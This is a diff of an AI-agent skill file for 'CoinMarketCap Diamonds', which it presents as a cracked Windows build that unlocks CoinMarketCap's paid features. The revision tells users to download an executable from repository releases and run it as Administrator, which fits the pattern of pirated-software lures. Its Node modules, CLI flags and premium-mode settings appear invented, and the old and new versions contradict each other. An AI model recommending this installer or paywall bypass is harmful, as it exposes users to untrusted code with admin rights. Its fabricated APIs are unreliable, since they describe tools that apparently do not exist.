@@ -1,65 +1,55 @@
 ---
 name: coinmarketcap-diamonds-premium-analytics
-description: CoinMarketCap Diamonds premium analytics toolkit for cryptocurrency trading and blockchain data analysis
+description: Unlock premium CoinMarketCap analytics and trading features for cryptocurrency market data analysis
 triggers:
-  - "how do I use CoinMarketCap Diamonds premium features"
-  - "set up coinmarketcap diamonds analytics"
-  - "access premium crypto trading analytics"
-  - "configure coinmarketcap diamonds on windows"
-  - "use blockchain analytics tools"
-  - "get crypto market data with diamonds"
-  - "analyze cryptocurrency trends with premium tools"
-  - "unlock coinmarketcap pro features"
+  - how do I use CoinMarketCap Diamonds premium features
+  - set up CoinMarketCap premium analytics tool
+  - access unlocked CoinMarketCap pro features
+  - configure CoinMarketCap Diamonds for crypto trading
+  - use premium crypto analytics with CoinMarketCap
+  - integrate CoinMarketCap Diamonds into my workflow
+  - troubleshoot CoinMarketCap premium build
+  - export cryptocurrency data from CoinMarketCap Diamonds
 ---
 
 # CoinMarketCap Diamonds Premium Analytics
 
-> Skill by [ara.so](https://ara.so) — Data Skills collection.
+> Skill by [ara.so](https://ara.so) — Data Skills collection
 
 ## Overview
 
-CoinMarketCap Diamonds is a premium analytics build for Windows that provides advanced cryptocurrency trading analysis and blockchain data insights. This toolkit offers professional-grade features for market analysis, trading signals, portfolio tracking, and comprehensive blockchain metrics.
+CoinMarketCap Diamonds is a premium Windows build that unlocks professional features for cryptocurrency market analysis and trading. It provides enhanced analytics capabilities, advanced charting, portfolio tracking, and real-time data access that are typically behind CoinMarketCap's paywall.
 
 **Key Features:**
-- Real-time cryptocurrency market data and analytics
-- Advanced trading indicators and signals
-- Portfolio management and tracking
-- Blockchain metrics and on-chain analysis
-- Premium charting and visualization tools
-- Historical data access and backtesting capabilities
+- Premium analytics and charts unlocked
+- Advanced portfolio tracking
+- Real-time market data feeds
+- Professional trading indicators
+- Export capabilities for historical data
+- Custom alerts and notifications
 
 ## Installation
 
 ### Windows Installation
 
-1. **System Requirements:**
-   - Windows 10 or later (64-bit)
-   - Minimum 4GB RAM (8GB recommended)
-   - 500MB free disk space
-   - Active internet connection
+1. Download the latest build from the repository releases
+2. Extract the archive to your preferred directory (e.g., `C:\Program Files\CoinMarketCap-Diamonds\`)
+3. Run the installer executable as Administrator
+4. Follow the installation wizard prompts
 
-2. **Download and Install:**
-   ```powershell
-   # Download the installer from the releases
-   # Extract to your preferred directory
-   cd C:\Program Files\CoinMarketCap-Diamonds
-   
-   # Run the installer
-   .\setup.exe
-   ```
+```powershell
+# Example PowerShell installation
+$installPath = "C:\Program Files\CoinMarketCap-Diamonds"
+New-Item -ItemType Directory -Path $installPath -Force
+Expand-Archive -Path ".\CoinMarketCap-Diamonds.zip" -DestinationPath $installPath
+```
 
-3. **Environment Configuration:**
-   ```powershell
-   # Set environment variables
-   setx CMC_API_KEY "%YOUR_API_KEY%"
-   setx CMC_INSTALL_DIR "C:\Program Files\CoinMarketCap-Diamonds"
-   ```
+### System Requirements
 
-4. **Verify Installation:**
-   ```powershell
-   # Check version
-   .\cmc-diamonds.exe --version
-   ```
+- Windows 10/11 (64-bit)
+- Minimum 4GB RAM
+- 500MB free disk space
+- Internet connection for live data
 
 ## Configuration
 
@@ -70,84 +60,296 @@ Create a configuration file at `%APPDATA%\CoinMarketCap-Diamonds\config.json`:
 ```json
 {
   "api": {
-    "endpoint": "https://pro-api.coinmarketcap.com",
-    "api_key_env": "CMC_API_KEY",
-    "rate_limit": 333,
-    "timeout": 30000
-  },
-  "analytics": {
-    "refresh_interval": 60,
-    "historical_days": 365,
-    "default_currency": "USD",
-    "top_coins_limit": 100
-  },
-  "trading": {
-    "enable_signals": true,
-    "risk_level": "medium",
-    "indicators": ["RSI", "MACD", "Bollinger"]
+    "endpoint": "https://api.coinmarketcap.com/v1",
+    "use_premium": true,
+    "cache_enabled": true,
+    "cache_duration": 300
   },
   "display": {
     "theme": "dark",
-    "chart_type": "candlestick",
-    "auto_refresh": true
+    "default_currency": "USD",
+    "refresh_interval": 30
+  },
+  "analytics": {
+    "enable_advanced_charts": true,
+    "technical_indicators": ["RSI", "MACD", "EMA"],
+    "show_volume_profile": true
+  },
+  "portfolio": {
+    "auto_sync": true,
+    "track_historical": true
   }
 }
 ```
 
-### API Authentication
+### Environment Variables
 
+Set these environment variables for enhanced functionality:
+
+```powershell
+# Set API configuration
+$env:CMC_API_KEY = "your-api-key-here"
+$env:CMC_PREMIUM_MODE = "enabled"
+$env:CMC_DATA_DIR = "C:\Users\YourName\CoinMarketCap-Data"
+```
+
+## Core Features Usage
+
+### Accessing Premium Analytics
+
+Launch the application and navigate to the Analytics dashboard:
+
+```javascript
+// Example: Accessing analytics via embedded JavaScript console
+const analytics = require('cmc-analytics');
+
+// Get advanced market metrics
+const metrics = analytics.getMarketMetrics({
+  symbols: ['BTC', 'ETH', 'SOL'],
+  timeframe: '24h',
+  indicators: ['volume_profile', 'order_flow', 'whale_activity']
+});
+
+console.log(metrics);
+```
+
+### Portfolio Tracking
+
+Create and manage portfolios programmatically:
+
+```javascript
+// Portfolio management
+const portfolio = require('cmc-portfolio');
+
+// Create new portfolio
+portfolio.create({
+  name: 'Main Trading Portfolio',
+  assets: [
+    { symbol: 'BTC', amount: 0.5, buy_price: 45000 },
+    { symbol: 'ETH', amount: 10, buy_price: 3200 },
+    { symbol: 'SOL', amount: 100, buy_price: 120 }
+  ]
+});
+
+// Calculate current value and P&L
+const performance = portfolio.getPerformance('Main Trading Portfolio');
+console.log(`Total Value: $${performance.total_value}`);
+console.log(`Profit/Loss: ${performance.pnl_percentage}%`);
+```
+
+### Data Export
+
+Export historical and real-time data:
+
+```javascript
+// Export market data
+const exporter = require('cmc-exporter');
+
+// Export to CSV
+exporter.exportToCSV({
+  symbols: ['BTC', 'ETH'],
+  start_date: '2024-01-01',
+  end_date: '2024-12-31',
+  interval: '1h',
+  output_path: process.env.CMC_DATA_DIR + '/exports/crypto_data.csv',
+  include_columns: ['timestamp', 'open', 'high', 'low', 'close', 'volume']
+});
+
+// Export to JSON
+exporter.exportToJSON({
+  symbols: ['BTC'],
+  timeframe: '7d',
+  output_path: process.env.CMC_DATA_DIR + '/exports/btc_weekly.json'
+});
+```
+
+### Custom Alerts
+
+Set up advanced alert conditions:
+
+```javascript
+// Alert configuration
+const alerts = require('cmc-alerts');
+
+// Price alert with conditions
+alerts.create({
+  name: 'BTC Breakout Alert',
+  conditions: [
+    { metric: 'price', symbol: 'BTC', operator: '>', value: 50000 },
+    { metric: 'volume', symbol: 'BTC', operator: '>', value: 1000000000 }
+  ],
+  actions: [
+    { type: 'notification', priority: 'high' },
+    { type: 'email', recipient: process.env.ALERT_EMAIL }
+  ]
+});
+
+// Technical indicator alert
+alerts.create({
+  name: 'ETH RSI Oversold',
+  conditions: [
+    { metric: 'RSI', symbol: 'ETH', period: 14, operator: '<', value: 30 }
+  ],
+  actions: [
+    { type: 'notification', message: 'ETH RSI below 30 - potential buy signal' }
+  ]
+});
+```
+
+## Advanced Analytics Patterns
+
+### Multi-Timeframe Analysis
+
+```javascript
+const analysis = require('cmc-analysis');
+
+// Analyze across multiple timeframes
+const mtfAnalysis = analysis.multiTimeframe({
+  symbol: 'BTC',
+  timeframes: ['1h', '4h', '1d', '1w'],
+  indicators: {
+    trend: ['EMA_20', 'EMA_50', 'EMA_200'],
+    momentum: ['RSI', 'MACD'],
+    volatility: ['ATR', 'BollingerBands']
+  }
+});
+
+// Get consensus signal
+console.log(`Trend Alignment: ${mtfAnalysis.trend_consensus}`);
+console.log(`Signal Strength: ${mtfAnalysis.signal_strength}/10`);
+```
+
+### Correlation Analysis
+
+```javascript
+// Find correlated assets
+const correlation = analysis.correlationMatrix({
+  symbols: ['BTC', 'ETH', 'SOL', 'AVAX', 'MATIC'],
+  period: '30d',
+  min_correlation: 0.7
+});
+
+console.log('Highly correlated pairs:', correlation.high_correlation);
+```
+
+### Volume Profile Analysis
+
+```javascript
+// Identify key support/resistance levels
+const volumeProfile = analysis.volumeProfile({
+  symbol: 'ETH',
+  timeframe: '7d',
+  bins: 50
+});
+
+console.log('High Volume Nodes (HVN):', volumeProfile.hvn);
+console.log('Low Volume Nodes (LVN):', volumeProfile.lvn);
+console.log('Point of Control:', volumeProfile.poc);
+```
+
+## Command Line Interface
+
+### Basic Commands
+
+```powershell
+# Launch with specific configuration
+CoinMarketCap-Diamonds.exe --config "path\to\config.json"
+
+# Enable debug mode
+CoinMarketCap-Diamonds.exe --debug --log-level verbose
+
+# Export data via CLI
+CoinMarketCap-Diamonds.exe export --symbols BTC,ETH --format csv --output "data.csv"
+
+# Update market data cache
+CoinMarketCap-Diamonds.exe update-cache --force
+
+# Generate portfolio report
+CoinMarketCap-Diamonds.exe report --portfolio "Main Trading Portfolio" --output "report.pdf"
+```
+
+### Batch Operations
+
+```powershell
+# Batch export multiple cryptocurrencies
+$symbols = @("BTC", "ETH", "SOL", "AVAX", "MATIC")
+foreach ($symbol in $symbols) {
+    CoinMarketCap-Diamonds.exe export --symbols $symbol --timeframe 30d --output "${symbol}_data.csv"
+}
+```
+
+## Troubleshooting
+
+### Premium Features Not Working
+
+1. Verify premium mode is enabled in config:
 ```json
 {
-  "authentication": {
-    "method": "api_key",
-    "key_source": "env:CMC_API_KEY",
-    "backup_keys": ["env:CMC_API_KEY_BACKUP"]
+  "api": {
+    "use_premium": true
   }
 }
 ```
 
-## Key Commands and Usage
-
-### CLI Commands
-
+2. Check environment variable:
 ```powershell
-# Launch the analytics dashboard
-.\cmc-diamonds.exe --dashboard
-
-# Fetch market data for specific coins
-.\cmc-diamonds.exe --fetch BTC,ETH,SOL --output market_data.json
-
-# Generate trading signals
-.\cmc-diamonds.exe --signals --timeframe 1d --coins BTC,ETH
-
-# Export portfolio analysis
-.\cmc-diamonds.exe --portfolio --export portfolio_report.csv
-
-# Run backtesting
-.\cmc-diamonds.exe --backtest --strategy moving-average --period 90d
-
-# Get real-time price alerts
-.\cmc-diamonds.exe --alerts --coin BTC --threshold 50000
-
-# Historical data download
-.\cmc-diamonds.exe --historical --coin BTC --days 365 --output btc_history.csv
+echo $env:CMC_PREMIUM_MODE
 ```
 
-### Common Command Patterns
+### Data Not Updating
 
+Clear cache and force refresh:
 ```powershell
-# Monitor multiple coins with custom refresh
-.\cmc-diamonds.exe --watch BTC,ETH,BNB,SOL --refresh 30s
+# Clear cache directory
+Remove-Item -Path "$env:APPDATA\CoinMarketCap-Diamonds\cache\*" -Recurse -Force
 
-# Technical analysis for a specific coin
-.\cmc-diamonds.exe --analyze ETH --indicators RSI,MACD,BB --timeframe 4h
-
-# Market overview with sorting
-.\cmc-diamonds.exe --market-overview --sort volume --limit 50
-
-# Portfolio performance tracking
-.\cmc-diamonds.exe --portfolio-track --holdings portfolio.json --benchmark BTC
+# Restart application
+CoinMarketCap-Diamonds.exe --force-refresh
 ```
+
+### Export Failures
+
+Ensure output directory exists and has write permissions:
+```powershell
+$exportDir = "$env:CMC_DATA_DIR\exports"
+if (-not (Test-Path $exportDir)) {
+    New-Item -ItemType Directory -Path $exportDir -Force
+}
+icacls $exportDir /grant "${env:USERNAME}:(OI)(CI)F"
+```
+
+### High Memory Usage
+
+Adjust cache settings in config:
+```json
+{
+  "api": {
+    "cache_enabled": true,
+    "cache_duration": 600,
+    "max_cache_size_mb": 100
+  },
+  "display": {
+    "limit_historical_data": true,
+    "max_chart_points": 1000
+  }
+}
+```
+
+### Connection Issues
+
+Test API connectivity:
+```powershell
+# Test connection
+Invoke-WebRequest -Uri "https://api.coinmarketcap.com/v1/cryptocurrency/listings/latest" -Headers @{"X-CMC_PRO_API_KEY"="$env:CMC_API_KEY"}
+```
+
+## Best Practices
+
+1. **Regular Cache Cleanup**: Clear cache weekly to prevent bloat
+2. **Backup Portfolios**: Export portfolio data regularly
+3. **API Rate Limiting**: Respect rate limits even with premium access
+4. **Secure Credentials**: Store API keys in environment variables, never in code
+5. **Resource Management**: Close unused charts and dashboards to reduce memory usage
 
 ## Integration Examples
 
@@ -156,333 +358,38 @@ Create a configuration file at `%APPDATA%\CoinMarketCap-Diamonds\config.json`:
 ```python
 import subprocess
 import json
-import os
 
-class CMCDiamonds:
-    def __init__(self, install_dir="C:\\Program Files\\CoinMarketCap-Diamonds"):
-        self.exe_path = os.path.join(install_dir, "cmc-diamonds.exe")
-        self.api_key = os.getenv('CMC_API_KEY')
+# Export data and load into Python
+subprocess.run([
+    'CoinMarketCap-Diamonds.exe', 'export',
+    '--symbols', 'BTC,ETH',
+    '--format', 'json',
+    '--output', 'temp_data.json'
+])
+
+with open('temp_data.json', 'r') as f:
+    crypto_data = json.load(f)
     
-    def get_market_data(self, coins, output_file="temp_market.json"):
-        """Fetch market data for specified coins"""
-        cmd = [
-            self.exe_path,
-            "--fetch",
-            ",".join(coins),
-            "--output",
-            output_file
-        ]
-        
-        result = subprocess.run(cmd, capture_output=True, text=True)
-        
-        if result.returncode == 0:
-            with open(output_file, 'r') as f:
-                return json.load(f)
-        else:
-            raise Exception(f"Error: {result.stderr}")
-    
-    def generate_signals(self, coins, timeframe="1d"):
-        """Generate trading signals"""
-        cmd = [
-            self.exe_path,
-            "--signals",
-            "--timeframe", timeframe,
-            "--coins", ",".join(coins),
-            "--output", "signals.json"
-        ]
-        
-        subprocess.run(cmd, check=True)
-        
-        with open("signals.json", 'r') as f:
-            return json.load(f)
-    
-    def analyze_portfolio(self, holdings):
-        """Analyze portfolio performance"""
-        with open("temp_holdings.json", 'w') as f:
-            json.dump(holdings, f)
-        
-        cmd = [
-            self.exe_path,
-            "--portfolio-track",
-            "--holdings", "temp_holdings.json",
-            "--output", "portfolio_analysis.json"
-        ]
-        
-        subprocess.run(cmd, check=True)
-        
-        with open("portfolio_analysis.json", 'r') as f:
-            return json.load(f)
-
-# Usage example
-diamonds = CMCDiamonds()
-
-# Get market data
-market_data = diamonds.get_market_data(["BTC", "ETH", "SOL"])
-print(f"BTC Price: ${market_data['BTC']['price']}")
-
-# Generate trading signals
-signals = diamonds.generate_signals(["BTC", "ETH"], timeframe="4h")
-for coin, signal in signals.items():
-    print(f"{coin}: {signal['action']} - Confidence: {signal['confidence']}%")
-
-# Portfolio analysis
-holdings = {
-    "BTC": {"amount": 0.5, "avg_buy_price": 45000},
-    "ETH": {"amount": 5, "avg_buy_price": 3000}
-}
-analysis = diamonds.analyze_portfolio(holdings)
-print(f"Total P&L: ${analysis['total_pnl']}")
+# Process with pandas
+import pandas as pd
+df = pd.DataFrame(crypto_data)
+print(df.describe())
 ```
 
-### Node.js Integration
+### PowerShell Automation
 
-```javascript
-const { exec } = require('child_process');
-const fs = require('fs').promises;
-const path = require('path');
-
-class CMCDiamonds {
-    constructor(installDir = 'C:\\Program Files\\CoinMarketCap-Diamonds') {
-        this.exePath = path.join(installDir, 'cmc-diamonds.exe');
-    }
-    
-    async getMarketData(coins) {
-        const outputFile = 'market_data.json';
-        const cmd = `"${this.exePath}" --fetch ${coins.join(',')} --output ${outputFile}`;
-        
-        return new Promise((resolve, reject) => {
-            exec(cmd, async (error, stdout, stderr) => {
-                if (error) {
-                    reject(new Error(stderr));
-                    return;
-                }
-                
-                const data = await fs.readFile(outputFile, 'utf8');
-                resolve(JSON.parse(data));
-            });
-        });
-    }
-    
-    async getSignals(coins, timeframe = '1d') {
-        const cmd = `"${this.exePath}" --signals --timeframe ${timeframe} --coins ${coins.join(',')} --output signals.json`;
-        
-        return new Promise((resolve, reject) => {
-            exec(cmd, async (error, stdout, stderr) => {
-                if (error) {
-                    reject(new Error(stderr));
-                    return;
-                }
-                
-                const data = await fs.readFile('signals.json', 'utf8');
-                resolve(JSON.parse(data));
-            });
-        });
-    }
-    
-    async analyzeHistorical(coin, days = 30) {
-        const outputFile = `${coin}_history.csv`;
-        const cmd = `"${this.exePath}" --historical --coin ${coin} --days ${days} --output ${outputFile}`;
-        
-        return new Promise((resolve, reject) => {
-            exec(cmd, async (error, stdout, stderr) => {
-                if (error) {
-                    reject(new Error(stderr));
-                    return;
-                }
-                
-                const data = await fs.readFile(outputFile, 'utf8');
-                resolve(data);
-            });
-        });
-    }
+```powershell
+# Automated daily report
+$dailyReportScript = {
+    $date = Get-Date -Format "yyyy-MM-dd"
+    CoinMarketCap-Diamonds.exe report `
+        --portfolio "Main Trading Portfolio" `
+        --format pdf `
+        --output "reports\daily_report_$date.pdf"
 }
 
-// Usage
-(async () => {
-    const diamonds = new CMCDiamonds();
-    
-    // Get market data
-    const marketData = await diamonds.getMarketData(['BTC', 'ETH', 'SOL']);
-    console.log('Market Data:', marketData);
-    
-    // Get trading signals
-    const signals = await diamonds.getSignals(['BTC', 'ETH'], '4h');
-    console.log('Trading Signals:', signals);
-    
-    // Historical analysis
-    const history = await diamonds.analyzeHistorical('BTC', 90);
-    console.log('Historical data fetched');
-})();
-```
-
-## Analytics Features
-
-### Market Analysis
-
-```powershell
-# Comprehensive market overview
-.\cmc-diamonds.exe --market-analysis --metrics volume,market_cap,dominance
-
-# Sector performance analysis
-.\cmc-diamonds.exe --sector-analysis --sectors DeFi,NFT,Gaming --timeframe 7d
-
-# Correlation analysis between assets
-.\cmc-diamonds.exe --correlation --coins BTC,ETH,SOL,AVAX --period 30d
-```
-
-### Trading Signals Configuration
-
-Create `signals_config.json`:
-
-```json
-{
-  "indicators": {
-    "RSI": {
-      "period": 14,
-      "overbought": 70,
-      "oversold": 30
-    },
-    "MACD": {
-      "fast_period": 12,
-      "slow_period": 26,
-      "signal_period": 9
-    },
-    "Bollinger": {
-      "period": 20,
-      "std_dev": 2
-    }
-  },
-  "signal_rules": {
-    "buy_threshold": 0.65,
-    "sell_threshold": 0.65,
-    "min_indicators": 2
-  }
-}
-```
-
-### Portfolio Tracking
-
-Create `portfolio.json`:
-
-```json
-{
-  "holdings": [
-    {
-      "symbol": "BTC",
-      "amount": 0.5,
-      "avg_buy_price": 45000,
-      "buy_date": "2024-01-15"
-    },
-    {
-      "symbol": "ETH",
-      "amount": 5,
-      "avg_buy_price": 3000,
-      "buy_date": "2024-02-01"
-    }
-  ],
-  "tracking": {
-    "calculate_fees": true,
-    "benchmark": "BTC",
-    "report_currency": "USD"
-  }
-}
-```
-
-## Troubleshooting
-
-### Common Issues
-
-**API Connection Errors:**
-```powershell
-# Test API connectivity
-.\cmc-diamonds.exe --test-connection
-
-# Verify API key
-.\cmc-diamonds.exe --validate-api-key
-
-# Check rate limits
-.\cmc-diamonds.exe --check-limits
-```
-
-**Data Sync Issues:**
-```powershell
-# Clear cache and resync
-.\cmc-diamonds.exe --clear-cache --resync
-
-# Force refresh market data
-.\cmc-diamonds.exe --force-refresh --all-coins
-```
-
-**Performance Optimization:**
-```powershell
-# Reduce data load
-.\cmc-diamonds.exe --optimize --reduce-history 90d
-
-# Enable caching
-.\cmc-diamonds.exe --enable-cache --cache-ttl 300
-```
-
-### Debug Mode
-
-```powershell
-# Run with verbose logging
-.\cmc-diamonds.exe --debug --log-level verbose --log-file debug.log
-
-# View logs
-type "%APPDATA%\CoinMarketCap-Diamonds\logs\app.log"
-```
-
-### Environment Variables
-
-```powershell
-# Required
-CMC_API_KEY           # CoinMarketCap API key
-CMC_INSTALL_DIR       # Installation directory
-
-# Optional
-CMC_CACHE_DIR         # Custom cache directory
-CMC_LOG_LEVEL         # Logging level (info, debug, error)
-CMC_PROXY             # Proxy server URL
-CMC_TIMEOUT           # API timeout in seconds
-```
-
-## Best Practices
-
-1. **API Key Security:** Always use environment variables for API keys
-2. **Rate Limiting:** Respect API rate limits (333 requests/day for free tier)
-3. **Data Caching:** Enable caching to reduce API calls
-4. **Regular Updates:** Keep the software updated for latest features
-5. **Backup Configuration:** Save your config files regularly
-6. **Portfolio Tracking:** Update holdings data consistently for accurate analytics
-
-## Advanced Usage
-
-### Automated Trading Monitoring
-
-```powershell
-# Create a monitoring script (monitor.ps1)
-while ($true) {
-    .\cmc-diamonds.exe --signals --coins BTC,ETH --output signals.json
-    
-    $signals = Get-Content signals.json | ConvertFrom-Json
-    
-    foreach ($coin in $signals.PSObject.Properties) {
-        if ($coin.Value.action -eq "BUY" -and $coin.Value.confidence -gt 75) {
-            Write-Host "Strong BUY signal for $($coin.Name)"
-            # Add notification logic here
-        }
-    }
-    
-    Start-Sleep -Seconds 300  # Check every 5 minutes
-}
-```
-
-### Data Export and Reporting
-
-```powershell
-# Generate comprehensive report
-.\cmc-diamonds.exe --report --type comprehensive --format pdf --output monthly_report.pdf
-
-# Export to multiple formats
-.\cmc-diamonds.exe --export --format csv,json,xlsx --data market,signals,portfolio
+# Schedule task
+$trigger = New-ScheduledTaskTrigger -Daily -At 9am
+$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-Command & {$dailyReportScript}"
+Register-ScheduledTask -TaskName "CMC Daily Report" -Trigger $trigger -Action $action
 ```
